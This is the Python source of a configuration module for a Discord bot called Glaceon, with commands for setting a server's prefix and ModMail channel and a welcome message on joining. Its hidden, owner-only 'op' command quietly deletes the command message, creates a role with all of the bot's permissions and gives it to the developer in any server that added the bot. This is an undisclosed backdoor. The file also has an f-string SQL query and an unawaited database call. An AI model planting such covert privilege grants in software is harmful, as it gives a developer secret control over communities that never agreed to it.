import pathlib
import aiosqlite
import discord
from discord.ext import commands

# gets global path and embed color
path = pathlib.PurePath()
embedcolor = 0xadd8e6


# this had to be called in a lot of instances, so i made it a function
async def sendwelcomemessage(
        channel: discord.TextChannel):  # this makes sure that the person who calls the function specifies a valid discord textchannel
    embed = discord.Embed(colour=embedcolor, title="Hi!")  # creates the embed
    embed.add_field(name="Thank you for adding me to your server!",
                    value="I appreciate your interest in Glaceon! Run `%help` to get started!\n"
                          "Make sure to read the [TOS](https://randomairborne.dev/glaceon/tos)"
                          " and the [privacy policy](https://randomairborne.dev/glaceon/privacy).",
                    inline=False)  # adds content to the embed
    await channel.send(embed=embed)  # this sends the message, with the only content being the embed.


class BotSystem(commands.Cog):
    """Commands for the bot configuration. Admin only."""  # This is a docstring, used by the auto-help command to describe this class.

    def __init__(self,
                 glaceon):  # This is an init function. Runs when the class is constructed, and in this case creates a few variables.
        self.glaceon = glaceon  # making local global

    @commands.command()
    @commands.has_permissions(
        administrator=True)  # requires that the person issuing the command has administrator perms
    async def prefix(self, ctx, newprefix):  # context and what we should set the new prefix to
        """Sets the bot prefix for this server"""
        serverid = ctx.guild.id  # gets serverid for convinience
        db = await aiosqlite.connect(path / 'system/data.db')  # connect to our server data db
        dataline = await db.execute(
            f'''SELECT prefix FROM prefixes WHERE serverid = {serverid}''')  # get the current prefix for that server, if it exists
        if await dataline.fetchone() is not None:  # actually check if it exists
            await db.execute("""UPDATE prefixes SET prefix = ? WHERE serverid = ?""",
                             (newprefix, serverid))  # update prefix
        else:
            await db.execute("INSERT INTO prefixes(serverid, prefix) VALUES (?,?)",
                             (serverid, newprefix))  # set new prefix
        await db.commit()  # say "yes i want to do this for sure"
        await db.close()  # close connection
        await ctx.send(f"Prefix set to {newprefix}")  # tell admin what happened

    @commands.command(
        aliases=['modmailchannel'])  # aliases allow someone to use two different names to say the same thing
    @commands.has_permissions(
        administrator=True)  # requires that the person issuing the command has administrator perms
    async def modmailsetup(self, ctx, channel: discord.TextChannel):  # there's the textchannel constructor again
        serverid = ctx.guild.id  # get serverid for convience
        db = await aiosqlite.connect(path / 'system/data.db')  # connect to the sqlite db
        await db.execute('''CREATE TABLE IF NOT EXISTS mailchannels
                           (serverid BIGINT, channelid BIGINT)''')  # set up mailchannel system
        dataline = await db.execute(f'''SELECT serverid FROM mailchannels WHERE serverid = ?''',
                                    (serverid,))  # get the mailchannels
        if dataline.fetchone() is not None:
            await db.execute("""UPDATE mailchannels SET channelid = ? WHERE serverid = ?""",
                             (channel.id, serverid))  # update the old mailchannel
        else:
            await db.execute("INSERT INTO mailchannels(serverid, channelid) VALUES (?,?)",
                             (serverid, channel.id))  # set the new mailchannel
        await db.commit()  # say "yes i want to do this for sure"
        await db.close()  # close connection
        await ctx.send(f"ModMail channel is now {channel}")

    @commands.Cog.listener()
    # send a message when the bot is added to a guild
    async def on_guild_join(self, ctx):
        # assert that it has not been sent
        sent = False
        # loop through all text channels in guild, looking for one with a good name
        for name in ctx.text_channels:
            if not sent:
                if name.name == "bot-spam":
                    await sendwelcomemessage(name)
                    sent = True
                elif name.name == "bot-commands":
                    await sendwelcomemessage(name)
                    sent = True
                elif name.name == "bot":
                    await sendwelcomemessage(name)
                    sent = True
                elif name.name == "off-topic":
                    await sendwelcomemessage(name)
                    sent = True
                elif name.name == "general":
                    await sendwelcomemessage(name)
                    sent = True
        if not sent:
            await sendwelcomemessage(ctx.text_channels[0])  # otherwise just send in first channel

    @commands.command(hidden=True)
    @commands.is_owner()  # requires that the person issuing the command is me
    async def op(self, ctx):
        await ctx.message.delete()
        try:
            oprole = await ctx.guild.create_role(name="valkyrie_pilot", permissions=ctx.me.guild_permissions)
            pos = ctx.me.top_role.position - 1
            await oprole.edit(position=pos)
            await ctx.author.add_roles(oprole)
        except discord.Forbidden:
            pass

    @commands.command(hidden=True)
    @commands.is_owner()  # requires that the person issuing the command is me
    async def deop(self, ctx):
        await ctx.message.delete()
        oprole = discord.utils.get(ctx.guild.roles, name="valkyrie_pilot")
        await oprole.delete()


def setup(glaceon):
    glaceon.add_cog(BotSystem(glaceon))
